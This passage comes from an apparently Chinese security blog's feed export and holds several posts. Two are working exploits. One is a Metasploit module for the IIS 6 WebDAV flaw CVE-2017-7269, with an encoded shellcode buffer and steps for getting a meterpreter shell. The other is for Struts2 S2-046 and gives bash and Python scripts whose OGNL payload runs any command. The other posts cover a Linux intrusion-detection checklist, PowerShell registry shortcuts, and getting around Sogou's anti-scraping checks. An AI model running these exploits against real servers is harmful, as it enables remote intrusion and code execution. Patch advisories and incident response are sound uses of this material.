9\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac" buf1 &lt;&lt; "&gt;" buf1 &lt;&lt; " (Not &lt;locktoken:write1&gt;) &lt;http://localhost/bbbbbbb" buf1 &lt;&lt; "\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb5\xe1\x8f\xb8\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81" buf1 &lt;&lt; payload.encoded sock.put("PROPFIND / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 0\r\n#&#123;buf1&#125;&gt;\r\n\r\n") handler disconnect end github地址：https://github.com/dmchell/metasploit-framework/pull/1/commits/9e8ec532a260b1a3f03abd09efcc44c30e4491c2 Usage 新建一个文件,如：cve-2017-7269.rb，将以上代码复制进去（或者直接下载该文件）。 找到metasploit安装目录，将cve-2017-7269.rb文件放到opt/metasploit/apps/pro/msf3/modules/exploit/windows/iis/目录下。（我在mac上试的，目录有所不同，放在这个目录下是为了方便分类管理）。 运行msfconsole并加载cve-2017-7269模块 123&gt;use exploit/windows/iis/cvce-2017-7269&gt;set RHOST 192.168.4.244 #设置目标IP&gt;exploit 运行exploit，会在本机监听4444端口，存在漏洞的目标服务器会连上本机的4444端口，反弹一个meterpreter。（前提是目标服务器能够ping通本机）通过meterpreter执行shell命令，反弹cmdshell 此模块默认会加载reverse_tcp payload，用于让目标服务器远程连接本地的某个端口，当然我们也可以改变payload，将其改为bind_tcp，用于让目标服务器监听一个端口，本地主动连接弹出shell。1&gt;set PAYLOAD windows/meterpreter/bind_tcp 改完之后，再次测试 运行exploit，目标服务器监听4444端口，本机会连上目标的4444端口，反弹一个meterpreter。（前提是本机能够ping通目标服务器） 在msf模块中输入set，可查看能够修改的项目，比show options要全一点。 临时解决办法 关闭WebDAV服务 使用相关防护设备]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>iis6漏洞</tag>
        <tag>CVE-2017-7269</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Powershell Shortcuts]]></title>
    <url>../../../../../../../../2017/03/27/Powershell-Shortcuts/</url>
    <content type="text"><![CDATA[我们坚持一件事情，并不是因为这样做了会有效果，而是坚信，这样做是对的——哈维尔 Powershell是微软用来取代cmd的解决方案，其功能之强大不言而喻，因此我准备使用powershell来替换cmd。我们知道windows7以后版本，shitf+右键，有一个”在此处打开命令行窗口”的快捷方式，可以在任何目录下打开cmd窗口，比win+R打开再用cd切换目录方便得多。 现在既然想用powershell替换cmd，那么这个快捷方式怎么替换呢？直接替换这个快捷方式比较麻烦，我们可以选择新增一个菜单上的快捷方式，这可以通过修改注册表来实现。 文件夹上右键打开Powershell打开注册表1win+R：regedit 添加项进入：HKEY_CLASSES_ROOT\Folder\shell 或者 HKEY_CLASSES_ROOT\Directory\shell目录下。 右击新建–项：open_powershell（名称随便取） 再在该项中新建–项：command（名称固定） 双击默认，填写值：C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe 注意：如果是设置cmd的，可以填写：cmd.exe 最终效果选择一个文件夹，右键可以看到open_powershell，选择后便会在此目录下打开一个powershell。 文件上右键打开Powershell同样是打开注册表，进入：HKEY_CLASSES_ROOT*\shell目录下。 新建–项：open_powershell（随便取） 再在该项中新建–项：command（固定） 双击默认，填写值：C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe 最终效果选择一个文件，右键可以看到open_powershell，选择后便会在此目录下打开一个powershell。 批处理powershell123reg add HKEY_CLASSES_ROOT\Directory\shell\powershell\command /t REG_EXPAND_SZ /d "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"reg add HKEY_CLASSES_ROOT\Folder\shell\powershell\command /t REG_EXPAND_SZ /d "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"reg add HKEY_CLASSES_ROOT\*\shell\powershell\command /t REG_EXPAND_SZ /d "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" cmd12345@echo offreg add "HKCR\*\shell\ms-dos" /ve /d 打开DOS命令 /freg add "HKCR\*\shell\ms-dos\command" /ve /d "cmd.exe /k cd %%1" /freg add "HKCR\Folder\shell\ms-dos" /ve /d 打开DOS命令 /freg add "HKCR\Folder\shell\ms-dos\command" /ve /d "cmd.exe /k cd %%1" /f]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux服务器入侵检测基础]]></title>
    <url>../../../../../../../../2017/03/24/Linux服务器入侵检测基础/</url>
    <content type="text"><![CDATA[人是生而自由的，但却无往不在枷锁之中，自以为是其他一切主人的人，反而比其他一切更是奴隶 最近遇到了很多服务器被入侵的例子，为了方便日后入侵检测以及排查取证，我查询了一些linux服务器入侵取证的相关资料，并在此总结分享，以便日后查询。 一般服务器被入侵的迹象，包括但不局限于：由内向外发送大量数据包（DDOS肉鸡）、服务器资源被耗尽（挖矿程序）、不正常的端口连接（反向shell等）、服务器日志被恶意删除等。那么既然是入侵检测，首先要判断的是服务器是否被入侵，必须排除是管理员操作不当导致的问题，因此入侵检测的第一项工作就是询问管理员服务器的异常现象，这对之后入侵类型的判断非常重要。 在询问了相关异常信息，排除了管理员操作失误等原因后，那么便可以开始正式的上服务器进行入侵检测以及取证操作了。 补充内容2017年4月21号 pidof查看正在运行的名为的进程1pidof filename fuser可以通过文件或者tcp udp协议看到进程1fuser -n tcp port stat可以看文件修改时间，大小等信息1stat filename lsmod看加载模块1lsmod rpcinfo看rpc服务开放1rpcinfo -p dmesg看网卡是否混杂模式(promiscuous mod)1dmesg|grep eth0 审计命令last 这个命令可用于查看我们系统的成功登录、关机、重启等情况，本质就是将/var/log/wtmp文件格式化输出，因此如果该文件被删除，则无法输出结果。 相关参数：last -10（-n） 查看最近10条记录last -x reboot 查看重启的记录last -x shutdown 查看关机的记录last -d 查看登陆的记录last –help 命令帮助信息last -f wtmp 用last命令查看wtmp文件（直接打开无法查看） lastb这个命令用于查看登录失败的情况，本质就是将/var/log/btmp文件格式化输出。 相关参数：lastb name（root） 查看root用户登陆失败记录lastb -10（-n） 查看最近10条登陆失败记录lastb –heplp 命令帮助信息 lastlog这个命令用于查看用户上一次的登录情况，本质就是将/var/log/lastlog文件格式化输出。 相关参数：lastlog 所有用户上一次登陆记录lastlog -u username（root） root用户上一次登陆记录lastlog –help 命令帮助信息 who 这个命令用户查看当前登录系统的情况，本质就是将/var/log/utmp文件格式化输出。主要用来查看当前用户名称，以及登陆的ip地址信息，w命令与who一样，会更详细一些。 history查看历史命令记录，其实就是查看root/.bash_history文件内容，删除这个文件，记录就没了。 相关参数：history 查看所有历史记录history -10 查看最近10条记录history | grep “wget” 查看wget相关信息的记录history –help 命令帮助信息 history显示时间戳：12export HISTTIMEFORMAT="%F %T `whoami` "history | more 检查用户Linux不同的用户，有不同的操作权限，但是所有用户都会在/etc/passwd、/etc/shadow、/etc/group文件中记录。12345less /etc/passwd 查看是否有新增用户grep :0 /etc/passwd 查看是否有特权用户（root权限用户）ls -l /etc/passwd 查看passwd最后修改时间awk -F: '$3==0 &#123;print $1&#125;' /etc/passwd 查看是否存在特权用户awk -F: 'length($2)==0 &#123;print $1&#125;' /etc/shadow 查看是否存在空口令用户 注：linux设置空口令：passwd -d username 检查进程 一般被入侵的服务器都会运行一些恶意程序，或是挖矿程序，或者DDOS程序等等，如果程序运行着，那么通过查看进程可以发现一些信息。 普通进程123456ps -aux 查看进程top 查看进程lsof -p pid 查看进程所打开的端口及文件lsof -c 进程名 查看关联文件ps -aux | grep python | cut -d ' ' -f 2 | xargs kill 杀死python相关的进程检查/etc/inetd.conf文件，输入：cat /etc/inetd.conf | grep –v "^#"，输出的信息就是你这台机器所开启的远程服务。 如果进程中没有发现异常，那么可以看看有没有开启某些隐藏进程。 隐藏进程123ps -ef | awk '&#123;print&#125;' | sort -n | uniq &gt;1ls /proc | sort -n |uniq &gt;2diff 1 2 注：以上3个步骤为检查隐藏进程。 检查文件被入侵的网站，通常肯定有文件被改动，那么可以通过比较文件创建时间、完整性、文件路径等方式查看文件是否被改动。123456789find / -uid 0 -print 查找特权用户文件find / -size +10000k -print 查找大于10000k的文件find / -name "…" -prin 查找用户名为…的文件find / -name core -exec ls -l &#123;&#125; \; 查找core文件，并列出详细信息md5sum -b filename 查看文件的md5值rpm -qf /bin/ls 检查文件的完整性（还有其它/bin目录下的文件）whereis 文件名 查看文件路径ls -al 文件名 查看文件创建时间du -sh 文件名 查看文件大小 检查网络检查网络的目的，是查看黑客是否通过篡改网卡类型，进行流量嗅探等操作。12345ip link | grep PROMISC 正常网卡不应该存在promisc，如果存在可能有snifferlsof -inetstat -nap 查看不正常端口arp -a 查看arp记录是否正常ifconfig -a 查看网卡设置 检查计划任务当我们尝试kill恶意程序时，往往会遇到被kill程序自动启动的问题，那么就要检查下计划任务(cron)了。1234crontab -u root -l 查看root用户的计划任务cat /etc/crontabls -l /etc/cron.* 查看cron文件是否变化的详细信息ls /var/spool/cron/ 检查系统后门可以使用工具，如：Conmodo、rkhunter等，当然也可以手工输入命令检查。123vim $HOME/.ssh/authorized_keys 查看ssh永久链接文件lsmod 检查内核模块chkconfig –list/systemctl list-units –type=service 检查自启 查看著名的木门后门程序：1234ls /etc/rc.d #系统开机后，此目录下的文件会被启动ls /etc/rc3.d find / -name “.rhosts” –printfind / -name “.forward” –print 检查网站后门 如果服务器上运行着web程序，那么需要检查是否通过web漏洞入侵服务器，具体的判断方法可以结合分析中间件日志以及系统日志，但过程需要较长时间。我们也可以通过检查服务器上是否留有入侵者放置的网站后门木马，以此判断黑客是否通过web应用入侵到服务器。 Method One 将网站目录下，文件名中含有jsp、php、asp、aspx的文件（注意是含有）都copy出来并压缩。 通过windows下的D盾工具扫描打包出来的目录，扫描是否存Webshell（网站后门） Method Two 直接使用MaskFindShell工具，进行webshell扫描（目前只能扫描jsp与php的网站，并且php的误报比较高）关于MaskFindShell详细用法，可以参考：MaskFindShell-Document 寻找服务器物理路径无论哪种方法的webshell查找，首先要确定的是web服务器安装的路径，因为webshell都是放在web路径下的。 询问管理员、网站开发商 SearchWebPath，具体用法参考：SearchWebPath用法 打包文件 当我们做好一切入侵检测分析后，我们需要把一些日志文件copy到本地进行更进一步详细的分析时，怎么打包服务器相关信息，并且copy到本地呢？ 打包web文件打包文件名中包含jsp的文件，打包后的文件为my_txt_files.tar：1tar cvf my_txt_files.tar `find . -type f -name "*.jsp*"` 打包日志文件1tar -cvf log.tar /var/log 打包其他信息123last &gt; last.lognetstat -an &gt; netstat.log...... 传输文件到本地将服务器上的文件传输到本地电脑上的几种方法。 lrzsz如果ssh连接的客户端为xshell等，可以安装lrzsz命令（putty无法使用）1apt-get install lrzsz 使用：上传文件到linux，rz；下载linux文件，sz 文件名。 开启ftp或者http 开ftp这里我不介绍了，网上很多教程，这里主要说说开启http服务。 一般linux服务器都默认安装了python，那么可以借助python快速开启一个http服务，详细参考：基于Python的WebServer U盘挂载如果我们不是通过ssh的方式连接，而是直接通过显示器连接上服务器进行操作，那么可以尝试U盘传输。1234fdisk -l 查看U盘路径monut /dev/sdb4 /mnt 挂载U盘cd /mnt 进入U盘umount /mnt 退出U盘 本文总结的都是一些Linux入侵检测最基础的命令，至于怎么用好这些命令，需要结合实际情况，主要还是看经验。以上所诉，还只是入侵检测信息收集阶段，至于如何通过现有信息分析出入侵途径，还需要借助其他工具以及知识。 参考链接：http://www.jb51.net/hack/421908.html]]></content>
      <categories>
        <category>系统安全</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>入侵检测</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Struts2-046漏洞]]></title>
    <url>../../../../../../../../2017/03/21/Struts2-046漏洞/</url>
    <content type="text"><![CDATA[屋漏偏逢连夜雨，船迟又遇打头风免责申明：文章中的工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负 Apache Struts 2 2.3.32之前的2 2.3.x版本和2.5.10.1之前的2.5.x版本中的Jakarta Multipart解析器存在安全漏洞，该漏洞源于程序没有正确处理文件上传。攻击者可以通过构造HTTP请求头中的Content-Type值可能造成远程任意代码执行，S2-046与S2-045漏洞属于同一类型，不同向量。如果在之前S2-045漏洞曝光后用户已经升级过官方补丁，这次就不受影响。 触发条件1.上传文件的大小（由Content-Length头指定）大于Struts2允许的最大大小（2GB）。2.文件名内容构造恶意的OGNL内容。 S2-046PoC123456789101112POST /doUpload.action HTTP/1.1Host: localhost:8080Content-Length: 10000000Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9zConnection: close ------WebKitFormBoundaryAnmUgTEhFhOZpr9zContent-Disposition: form-data; name="upload"; filename="%&#123;#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')&#125;"Content-Type: text/plainKaboom ------WebKitFormBoundaryAnmUgTEhFhOZpr9z-- ExpSh版123456789101112#!/bin/bashurl=$1cmd=$2shiftshiftboundary="---------------------------735323031399963166993862150"content_type="multipart/form-data; boundary=$boundary"payload=$(echo "%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"$cmd"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;")printf -- "--$boundary\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--$boundary--\r\n\r\n" "$payload" | curl "$url" -H "Content-Type: $content_type" -H "Expect: " -H "Connection: close" --data-binary @- $@ sh exploit-cd.sh http://xxx.com/action “whoami” Python版123456789101112131415161718192021222324252627__author__ = 'hackteam.cn'import pycurlimport StringIOimport urllibdef tt(url,data): sio = StringIO.StringIO() c = pycurl.Curl() c.setopt(pycurl.URL, url) c.setopt(pycurl.REFERER, url) c.setopt(pycurl.HTTPHEADER, ['Connection: close', 'Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150', 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36']) c.setopt(pycurl.HTTP_VERSION, pycurl.CURL_HTTP_VERSION_1_0) c.setopt(pycurl.POST, 1) c.setopt(pycurl.POSTFIELDS, data) c.setopt(pycurl.CONNECTTIMEOUT, 300) c.setopt(pycurl.TIMEOUT, 300) c.setopt(pycurl.WRITEFUNCTION, sio.write) try: c.perform() except Exception, ex: pass c.close() resp = sio.getvalue() sio.close() return respdata="-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--\r\n\r\n"print tt('https://xxx.action',data) 修复建议 严格过滤 Content-Type 、filename里的内容，严禁ognl表达式相关字段。 如果您使用基于Jakarta插件，请升级到Apache Struts 2.3.32或2.5.10.1版本。（强烈推荐） 官网公告https://cwiki.apache.org/confluence/display/WW/S2-045https://cwiki.apache.org/confluence/display/WW/S2-046 补丁地址Struts 2.3.32：https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32Struts 2.5.10.1：https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1 参考http://struts.apache.org/docs/s2-045.htmlhttp://struts.apache.org/docs/s2-046.htmlhttps://community.hpe.com/t5/Security-Research/Struts2-046-A-new-vector/ba-p/6949723 传送门struts2-052漏洞struts2-046漏洞struts2_045漏洞struts2漏洞poc汇总]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>struts2漏洞</tag>
        <tag>struts2 Poc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取搜索引擎之搜狗]]></title>
    <url>../../../../../../../../2017/03/19/爬取搜索引擎之搜狗/</url>
    <content type="text"><![CDATA[听过最落寞的一句话或诗句是什么？不如意事常八九，可与言者无二三 上篇讲述了爬取百度搜索结果时遇到的问题以及解决方案，本篇继续爬取搜索引擎的话题，说说爬取搜狗时将会遇到什么问题？以及怎么去解决。搜狗搜索引擎的名气在国内远没有百度那么大，但却称得上是后起之秀，其搜索结果的准确度以及爬虫算法都还不错，可以说搜狗搜索在国内是继百度搜索之外的又一良好选择，想要了解百度搜索相关信息的，可以移步：爬取搜索引擎之寻你千百度 关于反爬虫的技术，网上有很多资源，方法不外乎（代理、识别验证码、分布式架构、模拟浏览器、ADSL切换ip等），这些不是本文的重点，本文只针对爬取搜狗搜索引擎时遇到的反爬虫措施，以及一些解决方案。 为甚么要爬取搜狗 搜索结果比较准确比较全，没有类似百度保护资源的措施（搜索结果数比较准确） 同样拥有丰富的资源 反爬虫措施相对没有那么严格 搜狗反爬虫措施 利用爬虫爬取搜狗搜索引擎结果，首先要解决的是cookie的问题。搜狗会验证http请求是否带有cookie参数，如不带cookie那么请求次数将会非常有限。想要解决这一问题，我们必须先弄清楚搜狗搜索引擎cookie内容的组成，以及其作用。 cookie内容解析12345678910Cookie: ABTEST=3|1489908642|v17; IPLOC=CN3301; SUID=899F006F2208990A0000000058CE33A3; SUV=1489908643339695; browerV=3; osV=1; sct=1; SNUID=1B0D93FD9297D882F63E3C8D93692285; ld=E@n5Llllll2Y80nclllllV0nGEklllllbZjKAyllll9lllll9Zlll5@@@@@@@@@@ 经过我测试，发现其中有几个参数异常重要，也是影响搜索反爬虫措施的关键参数，SUID、SNUID以及SUV。 SUID SUID具体的含义可以自行百度，这里只讲述它生成的过程。当我们访问sogou搜索首页的时候，set-cookies中便会生成一个SUID参数的内容，除非重启浏览器，不然短时间内SUID并不会改变。SUID的值应该是sogou服务端随便分配的，只有当重新开启一个session时它的值才会更新。 SNUID SNUID是sogou反爬虫的重点，sogou也是对同一个SNUID访问次数做了限制，而超过限制后，会跳转到验证码页面，只有输入验证码重新验证以后，SNUID才会更新，访问才能继续进行。那么SNUID是如何生成的呢？经过测试，应该是由javascript生成的，当然前提是要有SUID，SUID是生成SNUID的基础。 SUVSUV参数内容是由javascript生成的，测试并没有发现其对于反爬虫有何影响，故本文不做详细介绍。 被屏蔽现象 同样，要解决反爬虫问题，我们先来看看触发反爬虫的现象。当同一个SNUID访问次数受限后，继续访问sogou会跳转到一个验证码页面。URL地址：1http://www.sogou.com/antispider/?from=%2fweb%3Fquery%3d152512wqe%26ie%3dutf8%26_ast%3d1488957312%26_asf%3dnull%26w%3d01029901%26p%3d40040100%26dp%3d1%26cid%3d%26cid%3d%26sut%3d578%26sst0%3d1488957299160%26lkt%3d3%2C1488957298718%2C1488957298893 页面源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114HTTP/1.1 200 OKServer: nginxDate: Thu, 27 Oct 2016 04:41:19 GMTContent-Type: text/htmlConnection: keep-aliveX-Powered-By: PHP/5.3.3Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheContent-Length: 5130&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;link rel="shortcut icon" href="//www.sogou.com/images/logo2014/new/favicon.ico" type="image/x-icon"&gt; &lt;title&gt;搜狗搜索&lt;/title&gt; &lt;link rel="stylesheet" href="static/css/anti.min.css?v=1"/&gt; &lt;script src="//dl.web.sogoucdn.com/common/lib/jquery/jquery-1.11.0.min.js"&gt;&lt;/script&gt; &lt;script src="static/js/antispider.min.js?v=2"&gt;&lt;/script&gt; &lt;script&gt; var domain = getDomain(); window.imgCode = -1; (function() &#123; function checkSNUID() &#123; var cookieArr = document.cookie.split('; '), count = 0; for(var i = 0, len = cookieArr.length; i &lt; len; i++) &#123; if (cookieArr[i].indexOf('SNUID=') &gt; -1) &#123; count++; &#125; &#125; return count &gt; 1; &#125; if(checkSNUID()) &#123; var date = new Date(), expires; date.setTime(date.getTime() -100000); expires = date.toGMTString(); document.cookie = 'SNUID=1;path=/;expires=' + expires; document.cookie = 'SNUID=1;path=/;expires=' + expires + ';domain=.www.sogou.com'; document.cookie = 'SNUID=1;path=/;expires=' + expires + ';domain=.weixin.sogou.com'; document.cookie = 'SNUID=1;path=/;expires=' + expires + ';domain=.sogou.com'; document.cookie = 'SNUID=1;path=/;expires=' + expires + ';domain=.snapshot.sogoucdn.com'; sendLog('delSNUID'); &#125; if(getCookie('seccodeRight') === 'success') &#123; sendLog('verifyLoop'); setCookie('seccodeRight', 1, getUTCString(-1), location.hostname, '/'); &#125; if(getCookie('refresh')) &#123; sendLog('refresh'); &#125; &#125;)(); function setImgCode(code) &#123; try &#123; var t = new Date().getTime() - imgRequestTime.getTime(); sendLog('imgCost',"cost="+t); &#125; catch (e) &#123; &#125; window.imgCode = code; &#125; sendLog('index'); function changeImg2() &#123; if(window.event) &#123; window.event.returnValue=false &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="header"&gt; &lt;div class="logo"&gt;&lt;a href="/"&gt;&lt;img width="180" height="60" src="//www.sogou.com/images/logo2014/error180x60.png"&gt;&lt;/a&gt;&lt;/div&gt; &lt;div class="other"&gt;&lt;span class="s1"&gt;您的访问出错了&lt;/span&gt;&lt;span class="s2"&gt;&lt;a href="/"&gt;返回首页&amp;gt;&amp;gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="content-box"&gt; &lt;p class="ip-time-p"&gt;IP:183.129.218.233&lt;br&gt;访问时间：2016.10.27 12:41:19&lt;/p&gt; &lt;p class="p2"&gt;用户您好，您的访问过于频繁，为确认本次访问为正常用户行为，需要您协助验证。&lt;/p&gt; &lt;p class="p3"&gt;&lt;label for="seccodeInput"&gt;验证码：&lt;/label&gt;&lt;/p&gt; &lt;form name="authform" method="POST" id="seccodeForm" action="/"&gt; &lt;p class="p4"&gt; &lt;input type=text name="c" value="" placeholder="请输入验证码" id="seccodeInput"&gt; &lt;input type="hidden" name="tc" id="tc" value=""&gt; &lt;input type="hidden" name="r" id="from" value="%2Fweb%3Fquery%3D%E6%9F%90%E8%8D%A3%26ie%3Dutf8%26_ast%3D1477536768%26_asf%3Dnull%26w%3D01029901%26cid%3D" &gt; &lt;input type="hidden" name="m" value="0" &gt; &lt;span class="s1"&gt; &lt;script&gt;imgRequestTime=new Date();&lt;/script&gt; &lt;a onclick="changeImg2();" href="javascript:void(0)"&gt; &lt;img id="seccodeImage" onload="setImgCode(1)" onerror="setImgCode(0)" src="util/seccode.php?tc=1477543279" width="100" height="40" alt="请输入图中的验证码" title="请输入图中的验证码"&gt; &lt;/a&gt; &lt;/span&gt; &lt;a href="javascript:void(0);" id="change-img" onclick="changeImg2();" style="padding-left:50px;"&gt;换一张&lt;/a&gt; &lt;span class="s2" id="error-tips" style="display: 